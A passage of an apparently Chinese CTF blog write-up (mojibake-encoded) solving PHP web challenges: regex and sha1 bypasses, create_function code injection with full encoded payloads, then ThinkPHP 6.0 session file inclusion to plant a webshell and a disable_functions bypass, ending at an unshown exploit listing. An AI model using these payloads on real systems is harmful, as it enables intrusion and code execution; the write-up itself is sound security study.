&#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;aaa?aaa&quot;</span><br><span class="line">ç»“æœ:</span><br><span class="line">    $_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;aaa&quot;</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;aaa?aaa&#x3D;111&quot;</span><br><span class="line">ç»“æœ:</span><br><span class="line">    $_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;aaa&#x3D;111&quot;</span><br><span class="line">    </span><br><span class="line">å¯è§$_SERVER[&#39;QUERY_STRING&#39;] è·å–æŸ¥è¯¢è¯­å¥ å–çš„æ˜¯?ä¹‹åçš„å€¼</span><br></pre></td></tr></table></figure><p>è€Œä¸”$_SERVER[â€˜QUERY_STRINGâ€™]æ˜¯æ— æ³•è¿›è¡Œurldecode()ï¼Œè€Œ$_GET[]æ˜¯å¯ä»¥è¿›è¡Œurldecode()ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨urlç¼–ç è¿›è¡Œç»•è¿‡ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726134552144.png"></p><h3 id="å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…ç»•è¿‡"></a>å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å¯è§æˆ‘ä»¬éœ€è¦ä½¿æ­£åˆ™èƒ½åœ¨debuä¸­åŒ¹é…åˆ°<code>aqua_is_cute</code>ï¼Œä½†åˆä¸èƒ½ä½¿debu==â€™aqua_is_cuteâ€™ã€‚</p><p>è¿™ç§æˆ‘ä»¬å¯ä»¥ç”¨%0aæ¢è¡Œæ±¡æŸ“è¿›è¡Œç»•è¿‡ï¼Œpayload:</p><blockquote><p>?debu=aqua_is_cute%0a</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726135040913.png"></p><h3 id="REQUESTæ­£åˆ™ç»•è¿‡"><a href="#REQUESTæ­£åˆ™ç»•è¿‡" class="headerlink" title="$_REQUESTæ­£åˆ™ç»•è¿‡"></a>$_REQUESTæ­£åˆ™ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>foreach</code>å°†<code>$_REQUEST</code>çš„é”®å€¼èµ‹å€¼ç»™äº†<code>$value</code>ï¼Œç„¶åæ˜¯æ­£åˆ™åŒ¹é…<code>$value</code>æ˜¯å¦å«æœ‰å­—æ¯ï¼Œå¦åˆ™å°±die()ã€‚</p><p>è¿™é‡Œè¦è¯´ä¸€ä¸‹ï¼Œ$_REQUESTå¯ä»¥åŒæ—¶è·å–<code>$_GET</code>å’Œ<code>$_POST</code>çš„å€¼ï¼Œä½†æ˜¯æ˜¯æœ‰é¡ºåºçš„ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150128123.png"></p><p>è€Œå…·ä½“é¡ºåºå†³å®šæ˜¯åœ¨php.inié…ç½®æ–‡ä»¶ä¸­ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150339554.png"></p><blockquote><p>This directive describes the order in which PHP registers GET, POSTand Cookie variables into the _REQUEST array. Registration is donefrom left to right, newer values override older values. </p></blockquote><p>å¯ä»¥çœ‹åˆ°ä¼˜å…ˆå€¼æ˜¯POSTæ‰åˆ°GETï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨POSTè¦†ç›–GETçš„å€¼è¿›è¡Œç»•è¿‡ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150855285.png"></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150923698.png"></p><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡$_REQUESTæ­£åˆ™äº†ã€‚</p><h3 id="file-get-contents-æ–‡ä»¶æ¯”è¾ƒç»•è¿‡"><a href="#file-get-contents-æ–‡ä»¶æ¯”è¾ƒç»•è¿‡" class="headerlink" title="file_get_contents()æ–‡ä»¶æ¯”è¾ƒç»•è¿‡"></a>file_get_contents()æ–‡ä»¶æ¯”è¾ƒç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦file_get_contents($file)å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸<code>debu_debu_aqua</code>ç›¸ç­‰ï¼Œè€Œæˆ‘ä»¬ä¸æ¸…æ¥šæ˜¯å¦å­˜åœ¨å«æœ‰<code>debu_debu_aqua</code>å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶åä¹Ÿæ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªåè®®è¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua</span><br><span class="line">æˆ–è€…</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;</span><br></pre></td></tr></table></figure><h3 id="sha1-æ¯”è¾ƒç»•è¿‡"><a href="#sha1-æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha1()æ¯”è¾ƒç»•è¿‡"></a>sha1()æ¯”è¾ƒç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦<code>sha1($shana)</code>ä¸<code>sha1($passwd)</code>çš„å€¼ç›¸ç­‰ï¼Œä¸”<code>$shana</code>!=<code>$passwd</code>ï¼Œå¦åˆ™die()ã€‚</p><p>ç”±äºsha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726153139282.png"></p><h3 id="create-functionä»£ç æ³¨å…¥"><a href="#create-functionä»£ç æ³¨å…¥" class="headerlink" title="create_functionä»£ç æ³¨å…¥"></a>create_functionä»£ç æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°æœ€åäº†ï¼Œè¿™é‡Œbanäº†è¶…çº§å¤šçš„ä¸œè¥¿ï¼Œä½†æ˜¯åˆæœ‰ä¸€ä¸ª<code>incoude &quot;flag.php&quot;</code>ï¼Œé‚£è¿™æ˜æ˜¾ä¸æ˜¯è®©æˆ‘ä»¬è¿›è¡ŒRCE<code>cat flag.php</code>çš„äº†ã€‚</p><p>ç”±äºä¸Šé¢æœ‰ä¸€ä¸ª<code>extract($_GET[&quot;flag&quot;]);</code>ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ flag[code]æ•°ç»„è¿›è¡Œ<code>$code</code>å˜é‡è¦†ç›–ï¼Œè¿™æ ·å­<code>$code</code>å’Œ<code>$arg</code>éƒ½æ˜¯å¯æ§çš„äº†ï¼Œäºæ˜¯å°±å¯ä»¥è¿›è¡Œä»£ç æ³¨å…¥ï¼Œpayload:</p><blockquote><p>flag[arg]=}a();//&amp;flag[code]=create_function</p></blockquote><p>å…ˆè§£é‡Šä¸‹åŸç†ï¼Œcreate_function()å¯ä»¥æ„é€ ä¸€ä¸ªlambdaç±»å‹çš„å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myfun</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return($a+$b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myfun</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726162030048.png"></p><p>è¿™ç›¸å½“äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$a</span>+<span class="variable">$b</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ$codeæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œäººå·¥é—­åˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myfun</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return($a+$b);&#125;phpinfo();//&#x27;</span>);</span><br><span class="line"><span class="variable">$myfun</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726162333448.png"></p><p>äºæ˜¯å°±å¯ä»¥è¿›è¡Œä»£ç æ³¨å…¥äº†ã€‚</p><h3 id="è·å–flag"><a href="#è·å–flag" class="headerlink" title="è·å–flag"></a>è·å–flag</h3><p>ç”±äº<code>include &quot;flag.php&quot;</code>äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>get_defined_vars()</code>å°†æ‰€æœ‰å˜é‡çš„å€¼è¾“å‡ºå‡ºæ¥ã€‚</p><p>æœ€ç»ˆpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?%66%69%6c%65&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2</span><br><span class="line"></span><br><span class="line">è§£ç :</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure><p>å¯æƒœæ‹¿åˆ°äº†ä¸€ä¸ªFakeFlagï¼Œä½†æ˜¯å¥½æ­¹å‘Šè¯‰äº†real_flagåœ¨<code>realfl4g.php</code>é‡Œã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726163659721.png"></p><p>æ¥ä¸‹æ¥å°±éœ€è¦åŒ…å«<code>rea1fl4g.php</code>å¹¶ä¸”å¾—åˆ°flagã€‚</p><ul><li>ç”±äºincludeç”¨ä¸äº†ï¼Œé€‰æ‹©ç”¨requireã€‚</li><li>ç”±äº.ç”¨ä¸äº†ï¼Œå¯ä»¥ä½¿ç”¨base64_decodeç»•è¿‡ã€‚</li></ul><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?%66%69%6c%65&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2</span><br><span class="line"></span><br><span class="line">è§£ç :</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ‹¿åˆ°çš„è¿˜æ˜¯FakeFlagï¼Œè€Œä¸”æ²¡æœ‰flagå‚æ•°ï¼ŒæŸ¥çœ‹æºç å‘ç°<code>$rea1_f1114g</code>è¢«<code>unset()</code>äº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726164445523.png"></p><p>é€‰æ‹©ç›´æ¥è¯»æºç ï¼Œç”±äº<code>fopen()</code>å’Œ<code>fgets</code>éƒ½æ²¡æœ‰è¢«banï¼Œä½†ç”±äºåªèƒ½ä¸€è¡Œä¸€è¡Œçš„è¯»ï¼Œæ‰€æœ‰ç”¨whileå¾ªç¯è¯»ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?%66%69%6c%65&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%64%65%66%69%6e%65%28%61%2c%66%6f%70%65%6e%28%7e%28%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F%29%2c%72%29%29%3b%77%68%69%6c%65%28%21%66%65%6f%66%28%61%29%29%76%61%72%5f%64%75%6d%70%28%66%67%65%74%73%28%61%29%29%3b%66%63%6c%6f%73%65%28%61%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2</span><br><span class="line"></span><br><span class="line">è§£ç ï¼š</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;flag[arg]&#x3D;&#125;define(a,fopen(~(%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F),r));while(!feof(a))var_dump(fgets(a));fclose(a);&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure><p>base64_decode()æœ¬åœ°æµ‹è¯•å¯ä»¥ç”¨ï¼Œä½†æ˜¯æ”¾postmané‡Œç›´æ¥è·‘å°±ä¸è¡Œäº†ï¼Œæ‰€ä»¥é€‰æ‹©å–åè¿›è¡Œç»•è¿‡ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726170246047.png"></p><p>æœ€åå¾—åˆ°flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726170403566.png"></p><blockquote><p>flag{89a3d450-9605-4f80-8692-215310ebc838}</p></blockquote><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><h3 id="ThinkPhp6-0æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#ThinkPhp6-0æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ThinkPhp6.0æ–‡ä»¶åŒ…å«æ¼æ´"></a>ThinkPhp6.0æ–‡ä»¶åŒ…å«æ¼æ´</h3><p>å…·ä½“æ˜¯ä¸ªThinkPhp6.0 Session æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œ<a href="https://www.bugfor.com/vuls/3540.html">æ¼æ´åˆ†æå…·ä½“çœ‹è¿™é‡Œ</a>ã€‚</p><p>æˆ‘ä»¬å…·ä½“çœ‹å’‹ç”¨ï¼Œå…ˆç›´æ¥æ³¨å†Œä¸€ä¸ªè´¦å·ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727121657196.png"></p><p>ä¿®æ”¹PHPSESSIDçš„å€¼ä»¥è¾¾æˆæ–‡ä»¶åŒ…å«ï¼Œ(æ³¨æ„é™åˆ¶äº†32é•¿åº¦ï¼ŒåŒ…å«<code>.php</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727122018176.png"></p><p>ä¸Šä¼ æˆåŠŸåå¯åœ¨searchå¤„å†™ä¸€å¥è¯æœ¨é©¬ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727122151250.png"></p><p>ä¸Šä¼ æˆåŠŸåæ˜¯å‚¨å­˜åœ¨<code>/runtime/session/</code>é‡Œ</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727122634173.png"></p><h3 id="disable-functionsç»•è¿‡"><a href="#disable-functionsç»•è¿‡" class="headerlink" title="disable_functionsç»•è¿‡"></a>disable_functionsç»•è¿‡</h3><p>è¿™é‡Œç›´æ¥åœ¨phpinfoé‡Œå¯ä»¥çœ‹è§banäº†å¾ˆå¤šå‡½æ•°ï¼Œè™½ç„¶å¯ä»¥ç›´æ¥è¿æ¥è¿›èšå‰‘ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™ç›´æ¥æŸ¥çœ‹flagï¼Œé‚£å…«æˆå°±æ˜¯é€šè¿‡readflagæ‹¿åˆ°flagäº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727125517310.png"></p><h4 id="èšå‰‘disable-functionsç»•è¿‡"><a href="#èšå‰‘disable-functionsç»•è¿‡" class="headerlink" title="èšå‰‘disable_functionsç»•è¿‡"></a>èšå‰‘disable_functionsç»•è¿‡</h4><p>å¯ä»¥ç”¨èšå‰‘é‡Œ<code>disable_functions</code>æ’ä»¶ä¸­çš„<code>PHP7_Backtrace_UAFæ¨¡å¼è¿›è¡Œç»•è¿‡</code>ã€‚</p><blockquote><p>æ¼æ´åŸç†:</p><p>æ¼æ´åˆ©ç”¨çš„æ˜¯ debug_backtraceè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°çš„æ¼æ´è¿”å›å·²ç»é”€æ¯çš„å˜é‡çš„å¼•ç”¨è¾¾æˆå †æº¢å‡ºï¼Œæ¼æ´ä¸º<a href="https://bugs.php.net/bug.php?id=76047">bug #76047</a>ã€‚</p></blockquote><p>é€‰æ‹©<code>PHP7_Backtrace_UAF</code>æ¨¡å¼ï¼Œç‚¹å‡»å¼€å§‹ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727130518048.png"></p><p>ç„¶ååœ¨è™šæ‹Ÿç»ˆç«¯ç›´æ¥<code>/readflag</code>ï¼Œå³å¯æ‹¿åˆ°flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727130637316.png"></p><h4 id="Expä¸Šä¼ ç»•è¿‡"><a href="#Expä¸Šä¼ ç»•è¿‡" class="headerlink" title="Expä¸Šä¼ ç»•è¿‡"></a>Expä¸Šä¼ ç»•è¿‡</h4><p>ç½‘ä¸Šdalaoå†™çš„<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">exp</a>ï¼ŒåŸç†ä¹Ÿæ˜¯ä¸Šé¢çš„<code>debug_backtrace()</code>ï¼ŒæŠŠcommandæ”¹æˆ<code>/readflag</code>ï¼Œç„¶åé€šè¿‡èšå‰‘ä¸Šä¼ å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span 